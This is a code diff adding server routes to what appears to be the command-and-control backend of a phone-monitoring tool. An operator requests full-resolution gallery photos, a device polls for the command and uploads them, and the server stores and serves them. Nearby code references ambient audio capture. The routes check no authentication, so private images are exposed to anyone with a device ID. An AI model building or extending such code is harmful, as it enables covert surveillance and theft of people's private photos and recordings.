@@ -381,6 +381,80 @@ router.delete('/gallery/:deviceId/:mediaId', async (req, res) => {
   res.json({ success: true, message: 'Media deleted successfully' });
 });
 
+// Full-Resolution Gallery Image Pipeline
+const pendingGalleryFullRequests = new Map<string, string>(); // deviceId -> mediaId
+const liveFullGalleryStorage = new Map<string, { mediaId: string; base64: string; r2Url?: string }>();
+
+router.post('/gallery/request_full', (req, res) => {
+  const { deviceId, mediaId } = req.body || {};
+  if (deviceId && mediaId) {
+    pendingGalleryFullRequests.set(deviceId, mediaId);
+    pendingGalleryFullRequests.set('GLOBAL_LATEST', mediaId);
+  }
+  res.json({ success: true, message: `Full resolution requested for ${mediaId}` });
+});
+
+router.get('/gallery/command/:deviceId', (req, res) => {
+  const devId = req.params.deviceId;
+  let fullImageMediaId = pendingGalleryFullRequests.get(devId) || pendingGalleryFullRequests.get('GLOBAL_LATEST') || null;
+  if (fullImageMediaId) {
+    pendingGalleryFullRequests.delete(devId);
+    pendingGalleryFullRequests.delete('GLOBAL_LATEST');
+  }
+  res.json({ fullImageMediaId });
+});
+
+router.post('/gallery/upload_full', async (req, res) => {
+  const { deviceId, mediaId, base64, mimeType } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  let r2Url: string | undefined;
+
+  if (base64 && r2Service.isConfigured()) {
+    try {
+      const buffer = Buffer.from(base64, 'base64');
+      const r2Key = `gallery_full/${devId}/${mediaId}.jpg`;
+      const uploaded = await r2Service.uploadBuffer(r2Key, buffer, mimeType || 'image/jpeg');
+      r2Url = uploaded.url;
+    } catch (err) {
+      logger.warn({ err }, 'R2 full gallery image upload fallback');
+    }
+  }
+
+  liveFullGalleryStorage.set(`${devId}:${mediaId}`, { mediaId, base64, r2Url });
+
+  if (isMongoConnected()) {
+    try {
+      await GalleryMediaModel.updateOne(
+        { id: mediaId, deviceId: devId },
+        { $set: { fullBase64: base64, r2Url } }
+      );
+    } catch (_) {}
+  }
+
+  res.json({ success: true, r2Url });
+});
+
+router.get('/gallery/full/:deviceId/:mediaId', async (req, res) => {
+  const { deviceId, mediaId } = req.params;
+  const inMemory = liveFullGalleryStorage.get(`${deviceId}:${mediaId}`);
+  if (inMemory) {
+    res.json({ success: true, fullBase64: inMemory.base64, r2Url: inMemory.r2Url });
+    return;
+  }
+
+  if (isMongoConnected()) {
+    try {
+      const dbMedia = await GalleryMediaModel.findOne({ id: mediaId, deviceId }).lean();
+      if (dbMedia && (dbMedia.fullBase64 || dbMedia.r2Url)) {
+        res.json({ success: true, fullBase64: dbMedia.fullBase64, r2Url: dbMedia.r2Url });
+        return;
+      }
+    } catch (_) {}
+  }
+
+  res.json({ success: false, fullBase64: null });
+});
+
 // Direct Audio Hub & Live Ambient Streamer
 const liveAudioStorage = new Map<string, Array<any>>();
 const pendingAudioTasks = new Map<string, number>(); // deviceId -> durationSeconds
